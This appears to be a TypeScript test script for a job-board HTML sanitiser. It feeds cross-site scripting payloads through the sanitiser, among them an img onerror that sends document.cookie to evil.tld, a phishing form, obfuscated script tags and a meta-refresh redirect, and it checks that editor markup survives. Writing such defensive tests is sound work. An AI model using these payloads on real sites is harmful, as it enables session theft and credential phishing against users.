/**
 * Checks that job-description sanitisation strips script-bearing markup while
 * leaving the rich-text editor's own output intact.
 *
 *   npx tsx scripts/verify-sanitize.ts
 */
import { sanitizeJobHtml } from "../src/lib/sanitize";

let failures = 0;

/** The output must not contain anything that can execute or navigate. */
function assertInert(name: string, payload: string) {
  const out   = sanitizeJobHtml(payload);
  const lower = out.toLowerCase();
  const bad =
    lower.includes("<script") ||
    lower.includes("javascript:") ||
    lower.includes("<iframe") ||
    lower.includes("<object") ||
    lower.includes("<embed") ||
    lower.includes("<svg") ||
    lower.includes("<style") ||
    lower.includes("<form") ||
    lower.includes("<img") ||
    lower.includes("<a ") ||
    /\son\w+\s*=/.test(lower);      // onerror=, onload=, onmouseover=…

  if (bad) { failures++; console.log(`FAIL  ${name}\n        -> ${out}`); }
  else     { console.log(`  ok  ${name}`); }
}

function assertKept(name: string, input: string, expected: string) {
  const out = sanitizeJobHtml(input);
  if (out !== expected) { failures++; console.log(`FAIL  ${name}\n        got: ${out}\n        want: ${expected}`); }
  else                  { console.log(`  ok  ${name}`); }
}

console.log("— payloads must come out inert —");
assertInert("script tag",              `<script>alert(document.cookie)</script>`);
assertInert("img onerror",             `<img src=x onerror="fetch('//evil.tld?c='+document.cookie)">`);
assertInert("svg onload",              `<svg/onload=alert(1)>`);
assertInert("javascript: link",        `<a href="javascript:alert(1)">Apply here</a>`);
assertInert("data: URI link",          `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`);
assertInert("iframe",                  `<iframe src="//evil.tld"></iframe>`);
assertInert("style block",             `<style>body{display:none}</style>`);
assertInert("inline style expression", `<p style="background:url(javascript:alert(1))">hi</p>`);
assertInert("event handler on allowed tag", `<p onmouseover="alert(1)">Great role</p>`);
assertInert("credential-phishing form", `<form action="//evil.tld"><input name="password"></form>`);
assertInert("object tag",              `<object data="//evil.tld"></object>`);
assertInert("uppercase/obfuscated",    `<ScRiPt>alert(1)</ScRiPt>`);
assertInert("nested broken tag",       `<scr<script>ipt>alert(1)</scr</script>ipt>`);
assertInert("mixed into real content", `<p>We are hiring</p><script>alert(1)</script><p>Apply now</p>`);
assertInert("meta refresh",            `<meta http-equiv="refresh" content="0;url=//evil.tld">`);

console.log("\n— legitimate editor output must survive —");
assertKept("paragraph",   `<p>We are hiring a designer.</p>`, `<p>We are hiring a designer.</p>`);
assertKept("bold/italic", `<p><strong>Senior</strong> <em>remote</em> role</p>`, `<p><strong>Senior</strong> <em>remote</em> role</p>`);
assertKept("headings",    `<h2>Responsibilities</h2>`, `<h2>Responsibilities</h2>`);
assertKept("bullets",     `<ul><li>React</li><li>TypeScript</li></ul>`, `<ul><li>React</li><li>TypeScript</li></ul>`);
assertKept("ordered",     `<ol><li>Apply</li><li>Interview</li></ol>`, `<ol><li>Apply</li><li>Interview</li></ol>`);
assertKept("line break",  `<p>One<br />Two</p>`, `<p>One<br />Two</p>`);
assertKept("strike",      `<p><s>€40k</s> €50k</p>`, `<p><s>€40k</s> €50k</p>`);
assertKept("entities kept escaped", `<p>R&amp;D &lt;3</p>`, `<p>R&amp;D &lt;3</p>`);
assertKept("class stripped, text kept", `<p class="evil">Hello</p>`, `<p>Hello</p>`);
assertKept("empty input", ``, ``);

console.log(failures === 0 ? "\nAll checks passed." : `\n${failures} check(s) failed.`);
process.exit(failures === 0 ? 0 : 1);
